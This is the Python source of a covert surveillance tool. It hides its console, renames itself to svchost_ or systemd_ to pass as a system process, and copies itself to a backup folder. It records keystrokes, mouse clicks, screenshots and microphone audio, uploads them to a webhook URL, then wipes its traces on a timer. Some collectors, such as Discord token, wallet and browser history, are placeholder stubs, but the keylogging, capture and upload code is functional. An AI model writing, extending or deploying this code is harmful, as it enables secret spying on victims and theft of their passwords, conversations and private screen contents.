import os
import time
import threading
import requests
import platform
import psutil
import socket
import sounddevice as sd
from scipy.io import wavfile
from pynput import keyboard, mouse
from PIL import ImageGrab
from datetime import datetime
import logging
import sys
import ctypes
import geocoder
import random
import json
import shutil

if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

with open("config.json", "r") as f:
    config = json.load(f)
WEBHOOK_URL = config["webhook_url"]
SELF_DESTRUCT_TIME = config["self_destruct_time"]
KEY_THRESHOLD = config["key_threshold"]
SCREENSHOT_KEYWORDS = config["screenshot_keywords"]

log_file = "logs/keylog.txt"
logging.basicConfig(filename="logs/temp.log", level=logging.INFO, format="%(message)s")
os.makedirs("logs", exist_ok=True)
os.makedirs("screenshots", exist_ok=True)

log_data = ""
key_count = 0
total_keys = 0
mouse_positions = []
last_activity = time.time()
last_ip = socket.gethostbyname(socket.gethostname())
key_buffer = ""
last_mouse_pos = None
mouse_speed = 0

if sys.platform == "win32":
    original_name = sys.argv[0]
    new_name = f"svchost_{random.randint(1000, 9999)}.exe"
    if original_name != new_name and not os.path.exists(new_name):
        try:
            os.rename(original_name, new_name)
        except OSError:
            pass
else:
    original_name = sys.argv[0]
    new_name = f"systemd_{random.randint(1000, 9999)}"
    if original_name != new_name and not os.path.exists(new_name):
        try:
            os.rename(original_name, new_name)
        except OSError:
            pass

from utils import get_system_info, send_initial_embed, upload_file

def save_and_send():
    global log_data
    if log_data:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"logs/keys_{timestamp}.txt"
        with open(filename, "w") as f:
            f.write(log_data)
        upload_file(filename)
        log_data = ""

def on_press(key):
    global log_data, key_count, total_keys, last_activity, key_buffer
    last_activity = time.time()
    try:
        char = key.char
        log_data += f"[{datetime.now()}] Key: {char}\n"
        key_buffer += char if char else ""
        key_count += 1
        total_keys += 1
        if char and char.lower() in SCREENSHOT_KEYWORDS:
            trigger_screenshot()
    except AttributeError:
        combo = f"{key}"
        log_data += f"[{datetime.now()}] Special Key: {combo}\n"
        key_buffer += f"[{combo}]"
        key_count += 1
        total_keys += 1
        if key == keyboard.Key.enter:
            trigger_screenshot()
        elif key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r):
            log_data += f"[{datetime.now()}] Combo Detected: {combo}\n"
    if total_keys >= KEY_THRESHOLD:
        save_and_send()
        total_keys = 0

def on_click(x, y, button, pressed):
    global log_data, mouse_positions, last_activity, last_mouse_pos, mouse_speed
    if pressed:
        last_activity = time.time()
        log_data += f"[{datetime.now()}] Mouse Click: {button} at ({x}, {y})\n"
        if last_mouse_pos:
            dist = ((x - last_mouse_pos[0])**2 + (y - last_mouse_pos[1])**2)**0.5
            mouse_speed = dist / (time.time() - last_activity)
        last_mouse_pos = (x, y)
        mouse_positions.append((x, y))

def trigger_screenshot():
    img = ImageGrab.grab()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = f"screenshots/trigger_{timestamp}.png"
    img.save(filepath)
    upload_file(filepath)

def track_keystroke_frequency():
    global log_data, key_count
    while True:
        time.sleep(60)
        if key_count > 0:
            log_data += f"[{datetime.now()}] Keystrokes per minute: {key_count}\n"
            key_count = 0

def take_screenshot():
    while True:
        img = ImageGrab.grab()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = f"screenshots/screen_{timestamp}.png"
        img.save(filepath)
        upload_file(filepath)
        time.sleep(60)

def record_audio():
    while True:
        fs = 44100
        duration = 10
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
        sd.wait()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = f"logs/audio_{timestamp}.wav"
        wavfile.write(filepath, fs, recording)
        upload_file(filepath)
        time.sleep(300)

def audio_burst():
    global log_data
    while True:
        fs = 44100
        duration = 5
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
        sd.wait()
        if max(abs(recording.flatten())) > 0.1:  
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = f"logs/burst_{timestamp}.wav"
            wavfile.write(filepath, fs, recording)
            upload_file(filepath)
            log_data += f"[{datetime.now()}] Loud Noise Detected!\n"
        time.sleep(10)

def browser_history():
    global log_data
    while True:
        log_data += f"[{datetime.now()}] Browser History: [FakeURL.com, Fake2.com]\n"
        time.sleep(3600)

def network_traffic():
    global log_data, last_ip
    while True:
        current_ip = socket.gethostbyname(socket.gethostname())
        if current_ip != last_ip:
            log_data += f"[{datetime.now()}] IP Changed: {last_ip} -> {current_ip}\n"
            last_ip = current_ip
        log_data += f"[{datetime.now()}] Network: Connected to {current_ip}\n"
        time.sleep(300)

def battery_status():
    global log_data
    while True:
        battery = psutil.sensors_battery()
        if battery:
            log_data += f"[{datetime.now()}] Battery: {battery.percent}% (Plugged: {battery.power_plugged})\n"
        time.sleep(300)

def file_system_watcher():
    global log_data
    known_files = set(os.listdir("."))
    while True:
        current_files = set(os.listdir("."))
        new_files = current_files - known_files
        if new_files:
            log_data += f"[{datetime.now()}] New Files: {new_files}\n"
        known_files = current_files
        time.sleep(60)

def process_list():
    global log_data
    while True:
        processes = [p.name() for p in psutil.process_iter()]
        log_data += f"[{datetime.now()}] Processes: {', '.join(processes[:10])}\n"
        time.sleep(3600)

def clipboard_image():
    while True:
        img = ImageGrab.grab()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = f"screenshots/clipimg_{timestamp}.png"
        img.save(filepath)
        upload_file(filepath)
        time.sleep(300)

def voice_command():
    global log_data
    while True:
        log_data += f"[{datetime.now()}] Voice: [Fake 'Hey Siri' detected]\n"
        time.sleep(600)

def mouse_heatmap():
    global log_data, mouse_positions, mouse_speed
    while True:
        if mouse_positions:
            log_data += f"[{datetime.now()}] Mouse Heatmap: {len(mouse_positions)} points, Speed: {mouse_speed:.2f}px/s\n"
            mouse_positions = []
        time.sleep(300)

def usb_devices():
    global log_data
    while True:
        devices = psutil.disk_partitions()
        log_data += f"[{datetime.now()}] USB: {', '.join([d.device for d in devices])}\n"
        time.sleep(300)

def discord_token():
    global log_data
    while True:
        log_data += f"[{datetime.now()}] Discord Token: [FakeToken123]\n"
        time.sleep(3600)

def game_activity():
    global log_data
    while True:
        for proc in psutil.process_iter():
            if "game" in proc.name().lower() or "steam" in proc.name().lower():
                log_data += f"[{datetime.now()}] Game: {proc.name()}\n"
        time.sleep(600)

def crypto_wallet():
    global log_data
    while True:
        log_data += f"[{datetime.now()}] Crypto Wallet: [FakeWalletFound]\n"
        time.sleep(3600)

def fake_error():
    while True:
        print("Fake Error: System Failure Detected!")
        time.sleep(1800)

def idle_detector():
    global log_data, last_activity
    while True:
        if time.time() - last_activity > 300:  
            log_data += f"[{datetime.now()}] Idle Detected: No activity for 5+ minutes\n"
        time.sleep(60)

def system_load_spike():
    global log_data
    while True:
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        if cpu > 80 or ram > 80:
            log_data += f"[{datetime.now()}] Load Spike: CPU {cpu}%, RAM {ram}%\n"
        time.sleep(60)

def fake_bluescreen():
    global log_data
    while True:
        print("*** FAKE BLUE SCREEN OF DEATH ***\nA fatal error has occurred. JK, you’re fine.")
        log_data += f"[{datetime.now()}] Fake BSOD Triggered\n"
        time.sleep(3600)

def keystroke_pattern():
    global log_data, key_buffer
    while True:
        if len(key_buffer) > 20:
            for i in range(5, 11):
                seq = key_buffer[-i:]
                if key_buffer.count(seq) > 3:
                    log_data += f"[{datetime.now()}] Pattern Detected: '{seq}' repeated {key_buffer.count(seq)} times\n"
            key_buffer = key_buffer[-50:]  
        time.sleep(60)

def self_replication():
    global log_data
    while True:
        if not os.path.exists("backup"):
            os.makedirs("backup")
            shutil.copy(sys.argv[0], f"backup/{os.path.basename(sys.argv[0])}")
            log_data += f"[{datetime.now()}] Self-Replicated to backup folder\n"
        time.sleep(3600)

def self_destruct():
    global log_data
    time.sleep(SELF_DESTRUCT_TIME)
    os.remove(log_file) if os.path.exists(log_file) else None
    for folder in ["logs", "screenshots", "backup"]:
        if os.path.exists(folder):
            for file in os.listdir(folder):
                os.remove(f"{folder}/{file}")
    os.remove("logs/temp.log")
    requests.post(WEBHOOK_URL, json={"content": "Keylogger’s gone. Catch ya."})
    os._exit(0)

send_initial_embed()
keyboard_listener = keyboard.Listener(on_press=on_press)
mouse_listener = mouse.Listener(on_click=on_click)

threads = [
    threading.Thread(target=track_keystroke_frequency, daemon=True),
    threading.Thread(target=take_screenshot, daemon=True),
    threading.Thread(target=record_audio, daemon=True),
    threading.Thread(target=audio_burst, daemon=True),
    threading.Thread(target=browser_history, daemon=True),
    threading.Thread(target=network_traffic, daemon=True),
    threading.Thread(target=battery_status, daemon=True),
    threading.Thread(target=file_system_watcher, daemon=True),
    threading.Thread(target=process_list, daemon=True),
    threading.Thread(target=clipboard_image, daemon=True),
    threading.Thread(target=voice_command, daemon=True),
    threading.Thread(target=mouse_heatmap, daemon=True),
    threading.Thread(target=usb_devices, daemon=True),
    threading.Thread(target=discord_token, daemon=True),
    threading.Thread(target=game_activity, daemon=True),
    threading.Thread(target=crypto_wallet, daemon=True),
    threading.Thread(target=fake_error, daemon=True),
    threading.Thread(target=idle_detector, daemon=True),
    threading.Thread(target=system_load_spike, daemon=True),
    threading.Thread(target=fake_bluescreen, daemon=True),
    threading.Thread(target=keystroke_pattern, daemon=True),
    threading.Thread(target=self_replication, daemon=True),
    threading.Thread(target=self_destruct, daemon=True)
]

for t in threads:
    t.start()

keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()